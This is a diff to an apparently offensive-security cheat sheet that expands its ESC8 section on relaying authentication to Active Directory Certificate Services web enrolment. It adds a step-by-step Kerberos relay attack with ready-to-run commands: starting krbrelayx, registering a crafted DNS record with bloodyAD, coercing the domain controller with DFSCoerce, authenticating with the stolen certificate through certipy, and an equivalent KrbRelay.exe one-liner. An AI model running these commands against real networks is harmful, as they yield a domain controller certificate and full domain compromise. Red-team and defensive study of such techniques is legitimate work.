@@ -182,13 +182,15 @@ certipy ca -u $USER@$DOMAIN -p $PASSWORD \
   -issue-request <request-id>
 ```
 
-## ESC8: NTLM Relay to AD CS HTTP
+## ESC8: Relay to AD CS HTTP
+
+AD CS HTTP enrolment (`/certsrv/certfnsh.asp`) can be abused via both NTLM and Kerberos relay. The coercion and cert auth steps are the same for both; what differs is the relay tool and the prerequisite.
+
+### NTLM Relay
 
 **Conditions:**
-- AD CS has HTTP enrolment endpoint enabled (certsrv)
-- SMB signing disabled on target
-
-Relay an incoming NTLM auth (coerced from the DC) to the certsrv endpoint to obtain a domain controller certificate, then use PKINIT for a DA hash.
+- AD CS HTTP enrolment endpoint enabled
+- SMB signing disabled on the coerced host
 
 ```bash wrap
 # Start relay
@@ -201,6 +203,65 @@ PetitPotam.py $LHOST $DC_HOST
 
 # Authenticate with obtained cert
 certipy auth -pfx dc.pfx -dc-ip $DC_IP
+```
+
+### Kerberos Relay (krbrelayx)
+
+**Conditions:**
+- AD CS HTTP enrolment endpoint enabled
+- EPA (Extended Protection for Authentication) not enforced on certsrv (default on most installs)
+- SMB signing state does not matter
+
+Kerberos relay works when SMB signing is enforced and NTLM relay is blocked. The trick is a crafted DNS hostname that embeds a minimal marshalled `CREDENTIAL_TARGET_INFORMATION` structure. When the DC tries to connect to that hostname, Windows internally calls `CredMarshalTargetInfo` which appends a Base64-encoded struct to the SPN, producing a hostname like `DC-NETBIOS1UWhRCAA...`. DNS resolves that to your listener, so the DC sends its AP-REQ to you instead.
+
+<Steps>
+  <Step title="Start krbrelayx">
+    ```bash wrap
+    sudo krbrelayx.py \
+      --target http://$CA_HOST/certsrv/certfnsh.asp \
+      --adcs --template DomainController \
+      --interface-ip $LHOST
+    ```
+  </Step>
+  <Step title="Add a malicious DNS record">
+    The hostname is the DC's NetBIOS name with the fixed marshalled CREDENTIAL_TARGET_INFO suffix appended. bloodyAD registers it in AD DNS pointing at your listener.
+
+    ```bash wrap
+    bloodyAD -d $DOMAIN -u $USER -p $PASSWORD \
+      --host $DC_HOST --dc-ip $DC_IP \
+      add dnsRecord '${DC_NETBIOS}1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' $LHOST
+    ```
+  </Step>
+  <Step title="Coerce DC authentication">
+    Trigger the DC to authenticate to the malicious hostname. Any coercion tool works. `ERROR_BAD_NETPATH` is the expected response and means the coercion fired successfully.
+
+    ```bash wrap
+    # DFSCoerce (via MS-DFSNM NetrDfsRemoveStdRoot)
+    KRB5CCNAME=/tmp/krb5cc_1000 python3 dfscoerce.py -k -no-pass \
+      '${DC_NETBIOS}1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' $DC_HOST
+
+    # Or: PetitPotam, PrinterBug, Coercer — same outcome
+    ```
+  </Step>
+  <Step title="Authenticate with the obtained cert">
+    krbrelayx catches the AP-REQ, relays it to certsrv, and writes the PFX to disk.
+
+    ```bash wrap
+    certipy auth -pfx unknown.pfx -dc-ip $DC_IP
+
+    # Clean up the DNS record after
+    bloodyAD -d $DOMAIN -u $USER -p $PASSWORD \
+      --host $DC_HOST --dc-ip $DC_IP \
+      remove dnsRecord '${DC_NETBIOS}1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' $LHOST
+    ```
+  </Step>
+</Steps>
+
+From Windows, [KrbRelay](https://github.com/cube0x0/KrbRelay) handles coercion internally via DCOM — no separate DNS or coercion step needed:
+
+```powershell wrap
+KrbRelay.exe -spn http/$CA_HOST -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 `
+  -adcs -template DomainController
 ```
 
 ## ESC9: No Security Extension
